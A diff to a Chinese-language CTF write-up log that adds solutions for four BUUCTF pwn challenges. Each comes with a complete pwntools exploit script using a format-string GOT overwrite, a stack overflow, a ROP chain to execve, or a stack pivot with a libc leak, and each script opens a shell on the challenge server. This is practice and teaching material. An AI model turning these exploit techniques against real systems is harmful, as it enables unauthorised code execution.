@@ -352,7 +352,7 @@ sl('0x804854B')
 shell()
 ```
 
-## BUUCTF-mrctf2020_easy_equation
+## BUUCTF-mrctf2020_shellcode_revenge
 可见字符shellcode
 
 首先利用pwntools生成默认的shellcode 输入到文件中
@@ -391,8 +391,314 @@ s(sc)
 shell()
 ```
 
+## BUUCTF-wdb_2018_2nd_easyfmt
+无限格式化字符串漏洞
+
+<img width="248" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/fd33cb71-15a8-4847-a865-9b8dd23ff31b">
+
+首先通过格式化字符串读泄漏libc 再覆盖printf_got为system或one_gadget
+
+### exp_wdb_2018_2nd_easyfmt.py
+```python
+from pwn import *
+# p = process("./wdb_2018_2nd_easyfmt")
+p = remote("node4.buuoj.cn",26089)
+context.log_level = 'debug'
+# context.arch = 'amd64'
+# context(os="linux", arch="amd64",log_level = "debug")
+# libc = ELF("/lib/i386-linux-gnu/libc.so.6")
+libc = ELF("/mnt/hgfs/ubuntu/BUUCTF/source/ubuntu16/libc-2.23-32.so")
+
+r = lambda : p.recv()
+rx = lambda x: p.recv(x)
+ru = lambda x: p.recvuntil(x)
+rud = lambda x: p.recvuntil(x, drop=True)
+s = lambda x: p.send(x)
+sl = lambda x: p.sendline(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+shell = lambda : p.interactive()
+
+printf_got = 0x804a014
+
+offset = 6
+
+# 1.leak libc
+payload = p32(printf_got) + b'%6$s'
+
+ru('repeater?\n')
+raw_input("Ther")
+sl(payload)
+
+rx(4)
+
+libc_printf = u32(rx(4))
+success("libc_printf ==> {}".format(hex(libc_printf)))
+
+libc_base = libc_printf - libc.symbols['printf']
+success("libc_base ==> {}".format(hex(libc_base)))
+
+ones = [0x3ac6c, 0x3ac6e, 0x3ac72, 0x3ac79, 0x5fbd5, 0x5fbd6]
+# ones = [0x3a80c, 0x3a80e, 0x3a812, 0x3a819, 0x5f065, 0x5f066]
+
+# one_gadget = libc_base + ones[5]
+# success("one_gadget ==> {}".format(hex(one_gadget)))
+
+libc_system = libc_base + libc.symbols['system']
+success("libc_system ==> {}".format(hex(libc_system)))
+
+# 2.printf_got --> system
+payload = fmtstr_payload(6, {printf_got:libc_system}, write_size='short')
+
+raw_input("Ther")
+sl(payload)
+
+raw_input("Ther")
+sl("/bin/sh")
+
+shell()
+```
+
+## BUUCTF-mrctf2020_easy_equation
+只要满足等式即可执行system
+
+<img width="872" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/afdf1646-00fa-4354-bb46-8616df0d265f">
+
+利用格式化字符串写将judge修改为2即可 或者直接溢出覆盖返回地址为system
+
+### exp_mrctf2020_easy_equation.py
+```python
+from pwn import *
+# p = process("./mrctf2020_easy_equation")
+p = remote("node4.buuoj.cn",27947)
+context.log_level = 'debug'
+# context.arch = 'amd64'
+# context(os="linux", arch="amd64",log_level = "debug")
+
+r = lambda : p.recv()
+rx = lambda x: p.recv(x)
+ru = lambda x: p.recvuntil(x)
+rud = lambda x: p.recvuntil(x, drop=True)
+s = lambda x: p.send(x)
+sl = lambda x: p.sendline(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+shell = lambda : p.interactive()
+
+judge = 0x00000000060105C
+system = 0x0000000004006D0
+
+payload = b'a' * 9 + p64(system)
+
+raw_input("Ther")
+sl(payload)
+
+shell()
+```
+
+## BUUCTF-picoctf_2018_can_you_gets_me
+无限制栈溢出 静态链接 无libc
+
+<img width="275" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/f046c567-29b5-4aac-a502-76b60b15c605">
+
+直接通过ROPgadget生成rop链
+
+### exp_PicoCTF_2018_can-you-gets-me.py
+```python
+from pwn import *
+# sh = process("./PicoCTF_2018_can-you-gets-me")
+sh = remote("node4.buuoj.cn",27015)
+context.log_level = 'debug'
+# context.arch = 'amd64'
+# context(os="linux", arch="amd64",log_level = "debug")
+
+r = lambda : sh.recv()
+rx = lambda x: sh.recv(x)
+ru = lambda x: sh.recvuntil(x)
+rud = lambda x: sh.recvuntil(x, drop=True)
+s = lambda x: sh.send(x)
+sl = lambda x: sh.sendline(x)
+sa = lambda x, y: sh.sendafter(x, y)
+sla = lambda x, y: sh.sendlineafter(x, y)
+shell = lambda : sh.interactive()
+
+p = ''
+p += p32(0x0806f02a) # pop edx ; ret
+p += p32( 0x080ea060) # @ .data
+p += p32( 0x080b81c6) # pop eax ; ret
+p += '/bin'
+p += p32( 0x080549db) # mov dword ptr [edx], eax ; ret
+p += p32( 0x0806f02a) # pop edx ; ret
+p += p32( 0x080ea064) # @ .data + 4
+p += p32( 0x080b81c6) # pop eax ; ret
+p += '//sh'
+p += p32( 0x080549db) # mov dword ptr [edx], eax ; ret
+p += p32( 0x0806f02a) # pop edx ; ret
+p += p32( 0x080ea068) # @ .data + 8
+p += p32( 0x08049303) # xor eax, eax ; ret
+p += p32( 0x080549db) # mov dword ptr [edx], eax ; ret
+p += p32( 0x080481c9) # pop ebx ; ret
+p += p32( 0x080ea060) # @ .data
+p += p32( 0x080de955) # pop ecx ; ret
+p += p32( 0x080ea068) # @ .data + 8
+p += p32( 0x0806f02a) # pop edx ; ret
+p += p32( 0x080ea068) # @ .data + 8
+p += p32( 0x08049303) # xor eax, eax ; ret
+p += p32( 0x0807a86f) # inc eax ; ret
+p += p32( 0x0807a86f) # inc eax ; ret
+p += p32( 0x0807a86f) # inc eax ; ret
+p += p32( 0x0807a86f) # inc eax ; ret
+p += p32( 0x0807a86f) # inc eax ; ret
+p += p32( 0x0807a86f) # inc eax ; ret
+p += p32( 0x0807a86f) # inc eax ; ret
+p += p32( 0x0807a86f) # inc eax ; ret
+p += p32( 0x0807a86f) # inc eax ; ret
+p += p32( 0x0807a86f) # inc eax ; ret
+p += p32( 0x0807a86f) # inc eax ; ret
+p += p32( 0x0806cc25) # int 0x80
 
 
+payload = b'A' * 28 + p
+ru("GIVE ME YOUR NAME!\n")
 
+sl(payload)
 
+shell()
+```
+
+## BUUCTF-actf_2019_babystack
+存在0x10byte的溢出 并且能够知道我们的输入的地址（栈地址）
+
+<img width="420" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/80c7e62f-a490-45a1-902d-5ba3e2269c7b">
+
+可溢出的字节有限 考虑使用栈迁移扩大我们能利用的空间 我们将gadget写到我们输入的开始位置（stack）
+
+然后在最后覆盖ebp为stack-8 返回地址为leave_ret gadget 这样在程序返回时 就会去stack位置执行我们的gadget
+
+第一次gadget为泄漏libc 我们还需要一次控制程序的机会去调用system
+
+所以在第一次leak libc后 将ebp复原 然后再跳转到main函数中 以此进行下一次劫持控制流 具体如下
+
+```python
+# 1.leak stack
+ru('>')
+sl(str(0xE0))
+
+ru('Your message will be saved at ')
+
+stack = int(rx(14), 16)
+success("stack ==> {}".format(hex(stack)))
+
+# 2.leak libc
+payload = p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)
+payload+= p64(pop_rbp_ret) + p64(stack+0xD0+0x30) + p64(main)
+payload = payload.ljust(offset, b'A') + p64(stack-8)
+payload+= p64(leave_ret)
+
+ru('>')
+raw_input("Ther")
+s(payload)
+```
+
+泄漏libc后 再次劫持程序控制流 执行system("/bin/sh")
+
+```python
+ru('>')
+# raw_input("Ther")
+sl(str(0xE0))
+
+ru('Your message will be saved at ')
+stack = int(rx(14), 16)
+success("stack ==> {}".format(hex(stack)))
+
+# 3.system("/bin/sh")
+payload = p64(pop_rdi_ret) + p64(libc_binsh) + p64(libc_system)
+payload = payload.ljust(offset, b'A') + p64(stack-8)
+payload+= p64(leave_ret)
+```
+
+### exp_ACTF_2019_babystack.py
+```python
+from pwn import *
+# p = process("./ACTF_2019_babystack")
+p = remote("node4.buuoj.cn",28277)
+context.log_level = 'debug'
+# context.arch = 'amd64'
+# context(os="linux", arch="amd64",log_level = "debug")
+# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+libc = ELF("/mnt/hgfs/ubuntu/BUUCTF/source/ubuntu18/libc-2.27-64.so")
+
+r = lambda : p.recv()
+rx = lambda x: p.recv(x)
+ru = lambda x: p.recvuntil(x)
+rud = lambda x: p.recvuntil(x, drop=True)
+s = lambda x: p.send(x)
+sl = lambda x: p.sendline(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+shell = lambda : p.interactive()
+
+pop_rdi_ret = 0x0000000000400ad3
+leave_ret = 0x0000000000400a18
+puts_got = 0x0000000000601020
+puts_plt = 0x400730
+pop_rbp_ret = 0x0000000000400860
+
+main = 0x00000000040098D
+# main = 0x000000000400956
+
+offset = 216 - 8
+
+# 1.leak stack
+ru('>')
+sl(str(0xE0))
+
+ru('Your message will be saved at ')
+
+stack = int(rx(14), 16)
+success("stack ==> {}".format(hex(stack)))
+
+# 2.leak libc
+payload = p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)
+payload+= p64(pop_rbp_ret) + p64(stack+0xD0+0x30) + p64(main)
+payload = payload.ljust(offset, b'A') + p64(stack-8)
+payload+= p64(leave_ret)
+
+ru('>')
+raw_input("Ther")
+s(payload)
+
+ru("Byebye~\n")
+
+libc_puts = u64(rx(6).ljust(8, '\x00'))
+success("libc_puts ==> {}".format(hex(libc_puts)))
+
+libc_base = libc_puts - libc.symbols['puts']
+success("libc_base ==> {}".format(hex(libc_base)))
+
+libc_system = libc_base + libc.symbols['system']
+success("libc_system ==> {}".format(hex(libc_system)))
+
+libc_binsh = libc_base + libc.search('/bin/sh').next()
+success("libc_binsh ==> {}".format(hex(libc_binsh)))
+
+ru('>')
+# raw_input("Ther")
+sl(str(0xE0))
+
+ru('Your message will be saved at ')
+stack = int(rx(14), 16)
+success("stack ==> {}".format(hex(stack)))
+
+# 3.system("/bin/sh")
+payload = p64(pop_rdi_ret) + p64(libc_binsh) + p64(libc_system)
+payload = payload.ljust(offset, b'A') + p64(stack-8)
+payload+= p64(leave_ret)
+
+ru('>')
+# raw_input("Ther")
+s(payload)
+
+shell()
+```
 
